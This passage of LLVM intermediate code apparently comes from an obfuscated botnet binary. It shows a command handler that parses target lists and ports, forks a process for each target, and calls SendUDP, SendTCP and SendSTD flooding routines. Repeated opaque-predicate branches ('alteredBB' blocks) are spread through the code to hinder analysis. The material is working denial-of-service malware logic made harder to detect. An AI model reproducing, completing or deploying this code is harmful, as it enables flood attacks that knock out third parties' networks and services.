  %234 = load i8*, i8** %233, align 8
  %235 = call i32 @atoi(i8* %234) #9
  store i32 %235, i32* %7, align 4
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 4
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #9
  store i32 %239, i32* %8, align 4
  %240 = load i32, i32* %3, align 4
  %241 = icmp eq i32 %240, 6
  br i1 %241, label %242, label %247

; <label>:242:                                    ; preds = %224
  %243 = load i8**, i8*** %4, align 8
  %244 = getelementptr inbounds i8*, i8** %243, i64 5
  %245 = load i8*, i8** %244, align 8
  %246 = call i32 @atoi(i8* %245) #9
  br label %248

; <label>:247:                                    ; preds = %224
  br label %248

; <label>:248:                                    ; preds = %247, %242
  %249 = phi i32 [ %246, %242 ], [ 10, %247 ]
  store i32 %249, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %250 = load i8*, i8** %5, align 8
  %251 = call i8* @strstr(i8* %250, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %252 = icmp ne i8* %251, null
  br i1 %252, label %253, label %320

; <label>:253:                                    ; preds = %248
  %254 = load i32, i32* @x.73
  %255 = load i32, i32* @y.74
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %253
  %262 = load i8*, i8** %5, align 8
  %263 = call i8* @strtok(i8* %262, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %263, i8** %11, align 8
  %264 = load i32, i32* @x.73
  %265 = load i32, i32* @y.74
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %272

; <label>:272:                                    ; preds = %317, %originalBBpart224
  %273 = load i32, i32* @x.73
  %274 = load i32, i32* @y.74
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %272
  %281 = load i8*, i8** %11, align 8
  %282 = icmp ne i8* %281, null
  %283 = load i32, i32* @x.73
  %284 = load i32, i32* @y.74
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %282, label %291, label %319

; <label>:291:                                    ; preds = %originalBBpart228
  %292 = load i32, i32* @x.73
  %293 = load i32, i32* @y.74
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %291
  %300 = call i32 @listFork()
  %301 = icmp ne i32 %300, 0
  %302 = load i32, i32* @x.73
  %303 = load i32, i32* @y.74
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %301, label %317, label %310

; <label>:310:                                    ; preds = %originalBBpart232
  %311 = load i8*, i8** %11, align 8
  %312 = load i32, i32* %6, align 4
  %313 = load i32, i32* %7, align 4
  %314 = load i32, i32* %8, align 4
  %315 = load i32, i32* %9, align 4
  %316 = load i32, i32* %10, align 4
  call void @SendUDP(i8* %311, i32 %312, i32 %313, i32 %314, i32 %315, i32 %316)
  call void @_exit(i32 0) #11
  unreachable

; <label>:317:                                    ; preds = %originalBBpart232
  %318 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %318, i8** %11, align 8
  br label %272

; <label>:319:                                    ; preds = %originalBBpart228
  br label %331

; <label>:320:                                    ; preds = %248
  %321 = call i32 @listFork()
  %322 = icmp ne i32 %321, 0
  br i1 %322, label %323, label %324

; <label>:323:                                    ; preds = %320
  br label %1091

; <label>:324:                                    ; preds = %320
  %325 = load i8*, i8** %5, align 8
  %326 = load i32, i32* %6, align 4
  %327 = load i32, i32* %7, align 4
  %328 = load i32, i32* %8, align 4
  %329 = load i32, i32* %9, align 4
  %330 = load i32, i32* %10, align 4
  call void @SendUDP(i8* %325, i32 %326, i32 %327, i32 %328, i32 %329, i32 %330)
  call void @_exit(i32 0) #11
  unreachable

; <label>:331:                                    ; preds = %319
  br label %332

; <label>:332:                                    ; preds = %331, %originalBBpart212
  %333 = load i8**, i8*** %4, align 8
  %334 = getelementptr inbounds i8*, i8** %333, i64 0
  %335 = load i8*, i8** %334, align 8
  %336 = call i32 @strcmp(i8* %335, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.114, i32 0, i32 0)) #9
  %337 = icmp ne i32 %336, 0
  br i1 %337, label %619, label %338

; <label>:338:                                    ; preds = %332
  %339 = load i32, i32* @x.73
  %340 = load i32, i32* @y.74
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %338
  %347 = load i32, i32* %3, align 4
  %348 = icmp slt i32 %347, 6
  %349 = load i32, i32* @x.73
  %350 = load i32, i32* @y.74
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %348, label %403, label %357

; <label>:357:                                    ; preds = %originalBBpart236
  %358 = load i8**, i8*** %4, align 8
  %359 = getelementptr inbounds i8*, i8** %358, i64 3
  %360 = load i8*, i8** %359, align 8
  %361 = call i32 @atoi(i8* %360) #9
  %362 = icmp eq i32 %361, -1
  br i1 %362, label %403, label %363

; <label>:363:                                    ; preds = %357
  %364 = load i8**, i8*** %4, align 8
  %365 = getelementptr inbounds i8*, i8** %364, i64 2
  %366 = load i8*, i8** %365, align 8
  %367 = call i32 @atoi(i8* %366) #9
  %368 = icmp eq i32 %367, -1
  br i1 %368, label %403, label %369

; <label>:369:                                    ; preds = %363
  %370 = load i32, i32* %3, align 4
  %371 = icmp sgt i32 %370, 5
  br i1 %371, label %372, label %378

; <label>:372:                                    ; preds = %369
  %373 = load i8**, i8*** %4, align 8
  %374 = getelementptr inbounds i8*, i8** %373, i64 5
  %375 = load i8*, i8** %374, align 8
  %376 = call i32 @atoi(i8* %375) #9
  %377 = icmp slt i32 %376, 0
  br i1 %377, label %403, label %378

; <label>:378:                                    ; preds = %372, %369
  %379 = load i32, i32* %3, align 4
  %380 = icmp eq i32 %379, 7
  br i1 %380, label %381, label %404

; <label>:381:                                    ; preds = %378
  %382 = load i32, i32* @x.73
  %383 = load i32, i32* @y.74
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %381
  %390 = load i8**, i8*** %4, align 8
  %391 = getelementptr inbounds i8*, i8** %390, i64 6
  %392 = load i8*, i8** %391, align 8
  %393 = call i32 @atoi(i8* %392) #9
  %394 = icmp slt i32 %393, 1
  %395 = load i32, i32* @x.73
  %396 = load i32, i32* @y.74
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %394, label %403, label %404

; <label>:403:                                    ; preds = %originalBBpart240, %372, %363, %357, %originalBBpart236
  br label %1091

; <label>:404:                                    ; preds = %originalBBpart240, %378
  %405 = load i8**, i8*** %4, align 8
  %406 = getelementptr inbounds i8*, i8** %405, i64 1
  %407 = load i8*, i8** %406, align 8
  store i8* %407, i8** %12, align 8
  %408 = load i8**, i8*** %4, align 8
  %409 = getelementptr inbounds i8*, i8** %408, i64 2
  %410 = load i8*, i8** %409, align 8
  %411 = call i32 @atoi(i8* %410) #9
  store i32 %411, i32* %13, align 4
  %412 = load i8**, i8*** %4, align 8
  %413 = getelementptr inbounds i8*, i8** %412, i64 3
  %414 = load i8*, i8** %413, align 8
  %415 = call i32 @atoi(i8* %414) #9
  store i32 %415, i32* %14, align 4
  %416 = load i8**, i8*** %4, align 8
  %417 = getelementptr inbounds i8*, i8** %416, i64 4
  %418 = load i8*, i8** %417, align 8
  store i8* %418, i8** %15, align 8
  %419 = load i32, i32* %3, align 4
  %420 = icmp eq i32 %419, 7
  br i1 %420, label %421, label %426

; <label>:421:                                    ; preds = %404
  %422 = load i8**, i8*** %4, align 8
  %423 = getelementptr inbounds i8*, i8** %422, i64 6
  %424 = load i8*, i8** %423, align 8
  %425 = call i32 @atoi(i8* %424) #9
  br label %443

; <label>:426:                                    ; preds = %404
  %427 = load i32, i32* @x.73
  %428 = load i32, i32* @y.74
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %426
  %435 = load i32, i32* @x.73
  %436 = load i32, i32* @y.74
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %443

; <label>:443:                                    ; preds = %originalBBpart244, %421
  %444 = phi i32 [ %425, %421 ], [ 10, %originalBBpart244 ]
  store i32 %444, i32* %16, align 4
  %445 = load i32, i32* %3, align 4
  %446 = icmp sgt i32 %445, 5
  br i1 %446, label %447, label %468

; <label>:447:                                    ; preds = %443
  %448 = load i32, i32* @x.73
  %449 = load i32, i32* @y.74
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %447
  %456 = load i8**, i8*** %4, align 8
  %457 = getelementptr inbounds i8*, i8** %456, i64 5
  %458 = load i8*, i8** %457, align 8
  %459 = call i32 @atoi(i8* %458) #9
  %460 = load i32, i32* @x.73
  %461 = load i32, i32* @y.74
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %485

; <label>:468:                                    ; preds = %443
  %469 = load i32, i32* @x.73
  %470 = load i32, i32* @y.74
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %468
  %477 = load i32, i32* @x.73
  %478 = load i32, i32* @y.74
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %485

; <label>:485:                                    ; preds = %originalBBpart252, %originalBBpart248
  %486 = phi i32 [ %459, %originalBBpart248 ], [ 0, %originalBBpart252 ]
  %487 = load i32, i32* @x.73
  %488 = load i32, i32* @y.74
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %485
  store i32 %486, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %495 = load i8*, i8** %12, align 8
  %496 = call i8* @strstr(i8* %495, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %497 = icmp ne i8* %496, null
  %498 = load i32, i32* @x.73
  %499 = load i32, i32* @y.74
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %497, label %506, label %558

; <label>:506:                                    ; preds = %originalBBpart256
  %507 = load i32, i32* @x.73
  %508 = load i32, i32* @y.74
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %506
  %515 = load i8*, i8** %12, align 8
  %516 = call i8* @strtok(i8* %515, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %516, i8** %19, align 8
  %517 = load i32, i32* @x.73
  %518 = load i32, i32* @y.74
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %525

; <label>:525:                                    ; preds = %555, %originalBBpart260
  %526 = load i32, i32* @x.73
  %527 = load i32, i32* @y.74
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %525
  %534 = load i8*, i8** %19, align 8
  %535 = icmp ne i8* %534, null
  %536 = load i32, i32* @x.73
  %537 = load i32, i32* @y.74
  %538 = sub i32 %536, 1
  %539 = mul i32 %536, %538
  %540 = urem i32 %539, 2
  %541 = icmp eq i32 %540, 0
  %542 = icmp slt i32 %537, 10
  %543 = or i1 %541, %542
  br i1 %543, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %535, label %544, label %557

; <label>:544:                                    ; preds = %originalBBpart264
  %545 = call i32 @listFork()
  %546 = icmp ne i32 %545, 0
  br i1 %546, label %555, label %547

; <label>:547:                                    ; preds = %544
  %548 = load i8*, i8** %19, align 8
  %549 = load i32, i32* %13, align 4
  %550 = load i32, i32* %14, align 4
  %551 = load i8*, i8** %15, align 8
  %552 = load i32, i32* %17, align 4
  %553 = load i32, i32* %16, align 4
  %554 = load i32, i32* %18, align 4
  call void @SendTCP(i8* %548, i32 %549, i32 %550, i8* %551, i32 %552, i32 %553, i32 %554)
  call void @_exit(i32 0) #11
  unreachable

; <label>:555:                                    ; preds = %544
  %556 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %556, i8** %19, align 8
  br label %525

; <label>:557:                                    ; preds = %originalBBpart264
  br label %602

; <label>:558:                                    ; preds = %originalBBpart256
  %559 = call i32 @listFork()
  %560 = icmp ne i32 %559, 0
  br i1 %560, label %561, label %578

; <label>:561:                                    ; preds = %558
  %562 = load i32, i32* @x.73
  %563 = load i32, i32* @y.74
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %561
  %570 = load i32, i32* @x.73
  %571 = load i32, i32* @y.74
  %572 = sub i32 %570, 1
  %573 = mul i32 %570, %572
  %574 = urem i32 %573, 2
  %575 = icmp eq i32 %574, 0
  %576 = icmp slt i32 %571, 10
  %577 = or i1 %575, %576
  br i1 %577, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %1091

; <label>:578:                                    ; preds = %558
  %579 = load i32, i32* @x.73
  %580 = load i32, i32* @y.74
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %578
  %587 = load i8*, i8** %12, align 8
  %588 = load i32, i32* %13, align 4
  %589 = load i32, i32* %14, align 4
  %590 = load i8*, i8** %15, align 8
  %591 = load i32, i32* %17, align 4
  %592 = load i32, i32* %16, align 4
  %593 = load i32, i32* %18, align 4
  call void @SendTCP(i8* %587, i32 %588, i32 %589, i8* %590, i32 %591, i32 %592, i32 %593)
  call void @_exit(i32 0) #11
  %594 = load i32, i32* @x.73
  %595 = load i32, i32* @y.74
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  unreachable

; <label>:602:                                    ; preds = %557
  %603 = load i32, i32* @x.73
  %604 = load i32, i32* @y.74
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %602
  %611 = load i32, i32* @x.73
  %612 = load i32, i32* @y.74
  %613 = sub i32 %611, 1
  %614 = mul i32 %611, %613
  %615 = urem i32 %614, 2
  %616 = icmp eq i32 %615, 0
  %617 = icmp slt i32 %612, 10
  %618 = or i1 %616, %617
  br i1 %618, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %619

; <label>:619:                                    ; preds = %originalBBpart276, %332
  %620 = load i32, i32* @x.73
  %621 = load i32, i32* @y.74
  %622 = sub i32 %620, 1
  %623 = mul i32 %620, %622
  %624 = urem i32 %623, 2
  %625 = icmp eq i32 %624, 0
  %626 = icmp slt i32 %621, 10
  %627 = or i1 %625, %626
  br i1 %627, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %619
  %628 = load i8**, i8*** %4, align 8
  %629 = getelementptr inbounds i8*, i8** %628, i64 0
  %630 = load i8*, i8** %629, align 8
  %631 = call i32 @strcmp(i8* %630, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i32 0, i32 0)) #9
  %632 = icmp ne i32 %631, 0
  %633 = load i32, i32* @x.73
  %634 = load i32, i32* @y.74
  %635 = sub i32 %633, 1
  %636 = mul i32 %633, %635
  %637 = urem i32 %636, 2
  %638 = icmp eq i32 %637, 0
  %639 = icmp slt i32 %634, 10
  %640 = or i1 %638, %639
  br i1 %640, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %632, label %761, label %641

; <label>:641:                                    ; preds = %originalBBpart280
  %642 = load i32, i32* %3, align 4
  %643 = icmp slt i32 %642, 4
  br i1 %643, label %656, label %644

; <label>:644:                                    ; preds = %641
  %645 = load i8**, i8*** %4, align 8
  %646 = getelementptr inbounds i8*, i8** %645, i64 2
  %647 = load i8*, i8** %646, align 8
  %648 = call i32 @atoi(i8* %647) #9
  %649 = icmp slt i32 %648, 1
  br i1 %649, label %656, label %650

; <label>:650:                                    ; preds = %644
  %651 = load i8**, i8*** %4, align 8
  %652 = getelementptr inbounds i8*, i8** %651, i64 3
  %653 = load i8*, i8** %652, align 8
  %654 = call i32 @atoi(i8* %653) #9
  %655 = icmp slt i32 %654, 1
  br i1 %655, label %656, label %657

; <label>:656:                                    ; preds = %650, %644, %641
  br label %1091

; <label>:657:                                    ; preds = %650
  %658 = load i8**, i8*** %4, align 8
  %659 = getelementptr inbounds i8*, i8** %658, i64 1
  %660 = load i8*, i8** %659, align 8
  store i8* %660, i8** %20, align 8
  %661 = load i8**, i8*** %4, align 8
  %662 = getelementptr inbounds i8*, i8** %661, i64 2
  %663 = load i8*, i8** %662, align 8
  %664 = call i32 @atoi(i8* %663) #9
  store i32 %664, i32* %21, align 4
  %665 = load i8**, i8*** %4, align 8
  %666 = getelementptr inbounds i8*, i8** %665, i64 3
  %667 = load i8*, i8** %666, align 8
  %668 = call i32 @atoi(i8* %667) #9
  store i32 %668, i32* %22, align 4
  %669 = load i8*, i8** %20, align 8
  %670 = call i8* @strstr(i8* %669, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %671 = icmp ne i8* %670, null
  br i1 %671, label %672, label %752

; <label>:672:                                    ; preds = %657
  %673 = load i32, i32* @x.73
  %674 = load i32, i32* @y.74
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %672
  %681 = load i8*, i8** %20, align 8
  %682 = call i8* @strtok(i8* %681, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %682, i8** %23, align 8
  %683 = load i32, i32* @x.73
  %684 = load i32, i32* @y.74
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %691

; <label>:691:                                    ; preds = %733, %originalBBpart284
  %692 = load i8*, i8** %23, align 8
  %693 = icmp ne i8* %692, null
  br i1 %693, label %694, label %735

; <label>:694:                                    ; preds = %691
  %695 = load i32, i32* @x.73
  %696 = load i32, i32* @y.74
  %697 = sub i32 %695, 1
  %698 = mul i32 %695, %697
  %699 = urem i32 %698, 2
  %700 = icmp eq i32 %699, 0
  %701 = icmp slt i32 %696, 10
  %702 = or i1 %700, %701
  br i1 %702, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %694
  %703 = call i32 @listFork()
  %704 = icmp ne i32 %703, 0
  %705 = load i32, i32* @x.73
  %706 = load i32, i32* @y.74
  %707 = sub i32 %705, 1
  %708 = mul i32 %705, %707
  %709 = urem i32 %708, 2
  %710 = icmp eq i32 %709, 0
  %711 = icmp slt i32 %706, 10
  %712 = or i1 %710, %711
  br i1 %712, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %704, label %733, label %713

; <label>:713:                                    ; preds = %originalBBpart288
  %714 = load i32, i32* @x.73
  %715 = load i32, i32* @y.74
  %716 = sub i32 %714, 1
  %717 = mul i32 %714, %716
  %718 = urem i32 %717, 2
  %719 = icmp eq i32 %718, 0
  %720 = icmp slt i32 %715, 10
  %721 = or i1 %719, %720
  br i1 %721, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %713
  %722 = load i8*, i8** %23, align 8
  %723 = load i32, i32* %21, align 4
  %724 = load i32, i32* %22, align 4
  call void @SendSTD(i8* %722, i32 %723, i32 %724)
  call void @_exit(i32 0) #11
  %725 = load i32, i32* @x.73
  %726 = load i32, i32* @y.74
  %727 = sub i32 %725, 1
  %728 = mul i32 %725, %727
  %729 = urem i32 %728, 2
  %730 = icmp eq i32 %729, 0
  %731 = icmp slt i32 %726, 10
  %732 = or i1 %730, %731
  br i1 %732, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  unreachable

; <label>:733:                                    ; preds = %originalBBpart288
  %734 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %734, i8** %23, align 8
  br label %691

; <label>:735:                                    ; preds = %691
  %736 = load i32, i32* @x.73
  %737 = load i32, i32* @y.74
  %738 = sub i32 %736, 1
  %739 = mul i32 %736, %738
  %740 = urem i32 %739, 2
  %741 = icmp eq i32 %740, 0
  %742 = icmp slt i32 %737, 10
  %743 = or i1 %741, %742
  br i1 %743, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %735
  %744 = load i32, i32* @x.73
  %745 = load i32, i32* @y.74
  %746 = sub i32 %744, 1
  %747 = mul i32 %744, %746
  %748 = urem i32 %747, 2
  %749 = icmp eq i32 %748, 0
  %750 = icmp slt i32 %745, 10
  %751 = or i1 %749, %750
  br i1 %751, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %760

; <label>:752:                                    ; preds = %657
  %753 = call i32 @listFork()
  %754 = icmp ne i32 %753, 0
  br i1 %754, label %755, label %756

; <label>:755:                                    ; preds = %752
  br label %1091

; <label>:756:                                    ; preds = %752
  %757 = load i8*, i8** %20, align 8
  %758 = load i32, i32* %21, align 4
  %759 = load i32, i32* %22, align 4
  call void @SendSTD(i8* %757, i32 %758, i32 %759)
  call void @_exit(i32 0) #11
  unreachable

; <label>:760:                                    ; preds = %originalBBpart296
  br label %761

; <label>:761:                                    ; preds = %760, %originalBBpart280
  %762 = load i32, i32* @x.73
  %763 = load i32, i32* @y.74
  %764 = sub i32 %762, 1
  %765 = mul i32 %762, %764
  %766 = urem i32 %765, 2
  %767 = icmp eq i32 %766, 0
  %768 = icmp slt i32 %763, 10
  %769 = or i1 %767, %768
  br i1 %769, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %761
  %770 = load i8**, i8*** %4, align 8
  %771 = getelementptr inbounds i8*, i8** %770, i64 0
  %772 = load i8*, i8** %771, align 8
  %773 = call i32 @strcmp(i8* %772, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.116, i32 0, i32 0)) #9
  %774 = icmp ne i32 %773, 0
  %775 = load i32, i32* @x.73
  %776 = load i32, i32* @y.74
  %777 = sub i32 %775, 1
  %778 = mul i32 %775, %777
  %779 = urem i32 %778, 2
  %780 = icmp eq i32 %779, 0
  %781 = icmp slt i32 %776, 10
  %782 = or i1 %780, %781
  br i1 %782, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %774, label %919, label %783

; <label>:783:                                    ; preds = %originalBBpart2100
  %784 = load i32, i32* %3, align 4
  %785 = icmp slt i32 %784, 4
  br i1 %785, label %830, label %786

; <label>:786:                                    ; preds = %783
  %787 = load i32, i32* @x.73
  %788 = load i32, i32* @y.74
  %789 = sub i32 %787, 1
  %790 = mul i32 %787, %789
  %791 = urem i32 %790, 2
  %792 = icmp eq i32 %791, 0
  %793 = icmp slt i32 %788, 10
  %794 = or i1 %792, %793
  br i1 %794, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %786
  %795 = load i8**, i8*** %4, align 8
  %796 = getelementptr inbounds i8*, i8** %795, i64 2
  %797 = load i8*, i8** %796, align 8
  %798 = call i32 @atoi(i8* %797) #9
  %799 = icmp slt i32 %798, 1
  %800 = load i32, i32* @x.73
  %801 = load i32, i32* @y.74
  %802 = sub i32 %800, 1
  %803 = mul i32 %800, %802
  %804 = urem i32 %803, 2
  %805 = icmp eq i32 %804, 0
  %806 = icmp slt i32 %801, 10
  %807 = or i1 %805, %806
  br i1 %807, label %originalBBpart2104, label %originalBB102alteredBB

